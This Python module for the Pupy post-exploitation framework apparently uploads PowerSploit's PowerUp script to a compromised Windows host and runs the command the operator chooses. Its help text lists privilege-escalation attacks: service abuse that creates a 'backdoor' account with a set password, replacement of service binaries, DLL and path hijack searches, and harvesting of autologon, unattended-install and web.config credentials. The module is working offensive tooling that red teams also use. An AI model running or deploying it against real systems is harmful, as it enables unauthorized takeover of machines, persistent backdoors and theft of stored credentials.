# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import os
from modules.lib.windows.powershell_upload import execute_powershell_script

__class_name__="PowerUp"
ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))

@config(compat="windows", category="privesc")
class PowerUp(PupyModule):
    """ trying common Windows privilege escalation methods"""
    
    def init_argparse(self):
        commands_available = '''
Commandes available:\n
'"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile
Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC
Invoke-ServiceStart -ServiceName VulnSVC
Invoke-ServiceStop -ServiceName VulnSVC
Invoke-ServiceEnable -ServiceName VulnSVC
Invoke-ServiceDisable -ServiceName VulnSVC
$services = Get-ServiceUnquoted
Get-ServiceFilePermission
Get-ServicePermission
Get-ServiceDetail -ServiceName VulnSVC
Invoke-ServiceAbuse -ServiceName VulnSVC
Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john"
Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."
Write-ServiceBinary -ServiceName VulnSVC
Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
Write-ServiceBinary -ServiceName VulnSVC -Command "net ..."
Install-ServiceBinary -ServiceName VulnSVC
Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."
Restore-ServiceBinary -ServiceName VulnSVC
Find-DLLHijack
Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles
Find-DLLHijack -ExcludeOwned
Find-PathHijack
Get-RegAlwaysInstallElevated
Get-RegAutoLogon
Get-VulnAutoRun
Get-VulnSchTask
Get-UnattendedInstallFile
get-webconfig
get-webconfig | Format-Table -Autosize
get-ApplicationHost
get-ApplicationHost | Format-Table -Autosize
Write-UserAddMSI
Invoke-AllChecks
'''

        self.arg_parser = PupyArgumentParser(prog="PowerUp", description=self.__doc__, epilog=commands_available)
        self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-AllChecks', help='default: Invoke-AllChecks')

    def run(self, args):
        script = 'powerup'

        # check if file has been already uploaded to the target
        for arch in ['x64', 'x86']:
            if script not in self.client.powershell[arch]['scripts_loaded']:
                content = open(os.path.join(ROOT, "external", "PowerSploit", "Privesc", "PowerUp.ps1"), 'r').read()
            else:
                content = ''
        
        output = execute_powershell_script(self, content, args.command, script_name=script)
        
        # parse output depending on the PowerUp output
        output = output.replace('\r\n\r\n\r\n', '\r\n\r\n').replace("\n\n", "\n").replace("\n\n", "\n")
        self.success("%s" % output)
